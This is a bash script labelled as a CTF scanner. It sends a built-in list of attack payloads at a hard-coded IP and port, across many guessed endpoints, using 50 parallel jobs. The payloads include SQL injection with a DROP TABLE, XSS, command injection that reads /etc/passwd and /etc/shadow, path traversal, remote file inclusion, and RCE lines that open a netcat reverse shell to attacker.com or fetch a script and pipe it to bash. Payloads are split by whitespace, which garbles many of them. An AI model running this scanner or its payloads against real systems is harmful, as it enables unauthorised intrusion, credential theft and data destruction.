#!/bin/bash

# Advanced CTF Scanner for PoC (DEFCON)
# Target Configuration
TARGET="94.237.60.154"
PORT="57081"
THREADS=50 # Max number of concurrent threads to scan faster
ENDPOINTS=( "/flag" "/challenge" "/hidden" "/secret" "/admin" "/login" ) # Targets for scanning
LOG_FILE="ctf_flags_defcon.log"
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

# Create or clear the log file
> "$LOG_FILE"

# Declare an associative array to track flags found
declare -A found_flags

# Function to generate payloads (multiple CTF techniques)
generate_payloads() {
  # SQL Injection Payloads
  echo -e "' OR 1=1 --"
  echo -e "' UNION SELECT NULL, NULL, FLAG FROM flags --"
  echo -e "' OR 1=1 LIMIT 1 --"
  echo -e "admin' --"
  echo -e "' AND SLEEP(5) --"
  echo -e "' OR 'a'='a' --"
  echo -e "'; DROP TABLE users --"
  echo -e "1' OR '1' = '1'"

  # XSS Payloads
  echo -e "<script>alert('XSS')</script>"
  echo -e "<img src=x onerror=alert('XSS')>"
  echo -e "<script>document.location='javascript:alert(1)'</script>"
  echo -e "<svg onload=alert('XSS')>"

  # Command Injection Payloads
  echo -e "| ls"
  echo -e "| cat /etc/passwd"
  echo -e "| uname -a"
  echo -e "; cat /etc/shadow"
  echo -e "; id"

  # Path Traversal Payloads
  echo -e "../../../../etc/passwd"
  echo -e "../../../etc/shadow"
  echo -e "../../../../../var/www/html/index.php"
  echo -e "../../../../../etc/hosts"
  
  # Remote File Inclusion (RFI) Payloads
  echo -e "http://evil.com/malicious_script.php"
  echo -e "http://attacker.com/shell.php"
  
  # Local File Inclusion (LFI) Payloads
  echo -e "../../../../../../etc/passwd"
  echo -e "../../../../../../var/log/apache2/access.log"

  # Remote Code Execution Payloads (RCE)
  echo -e "| nc -e /bin/bash attacker.com 4444"
  echo -e "; wget http://attacker.com/malicious_script.sh -O /tmp/malicious.sh && sh /tmp/malicious.sh"
  echo -e "; curl http://attacker.com/shell.sh | bash"
}

# Function to scan an endpoint with multiple payloads
scan_endpoint() {
  local endpoint="$1"
  local id="$2"

  # Log and announce which endpoint is being scanned
  echo "[*] Scanning: $endpoint$id"

  # Generate realistic payloads for this endpoint
  local payloads=($(generate_payloads))

  # Loop through payloads
  for payload in "${payloads[@]}"; do
    # Log and simulate sending payloads
    echo "[*] Sending payload: $payload"

    # Construct the full URL with the payload
    RESPONSE=$(curl -s -A "$USER_AGENT" "$TARGET:$PORT$endpoint$id?input=$payload" --max-time 5)

    # Look for a common flag pattern (customizable)
    if echo "$RESPONSE" | grep -qE "FLAG\{[A-Za-z0-9_-]+\}"; then
      FLAG=$(echo "$RESPONSE" | grep -oE "FLAG\{[A-Za-z0-9_-]+\}")
      # Check if the flag has already been found
      if [[ -z "${found_flags[$FLAG]}" ]]; then
        echo "[+] Found flag: $FLAG at $endpoint$id with payload $payload"
        echo "$FLAG ($endpoint$id with payload $payload)" >> "$LOG_FILE"
        found_flags[$FLAG]=1
      fi
    fi
  done
}

# Parallelized scanning function with enhanced error handling and rate limiting
scan_concurrently() {
  local endpoint="$1"
  for id in $(seq 1 100); do
    # Limit concurrency with background jobs
    (
      scan_endpoint "$endpoint" "$id"
    ) &

    # Control the number of concurrent threads for speed (avoid system overload)
    while (( $(jobs | wc -l) >= THREADS )); do
      sleep 0.1
    done
  done

  # Wait for all jobs in this endpoint to finish
  wait
}

# Main function with logging and continuous scanning until all flags are found
main() {
  echo "[*] Starting CTF Scanner on $TARGET:$PORT"
  echo "[*] Targeted Endpoints: ${ENDPOINTS[@]}"
  
  # Loop through endpoints and scan concurrently
  while true; do
    for endpoint in "${ENDPOINTS[@]}"; do
      echo "[*] Scanning endpoint: $endpoint"
      scan_concurrently "$endpoint"
    done
    
    # Check if all flags have been found
    if [ ${#found_flags[@]} -gt 0 ] && [ $(wc -l < "$LOG_FILE") -gt 0 ]; then
      echo "[+] All flags have been found. Exiting scan."
      break
    fi
    echo "[*] Flags still not fully found, continuing scan..."
  done

  echo "[*] Scan completed. Results saved to $LOG_FILE"
}

# Run the main function
main
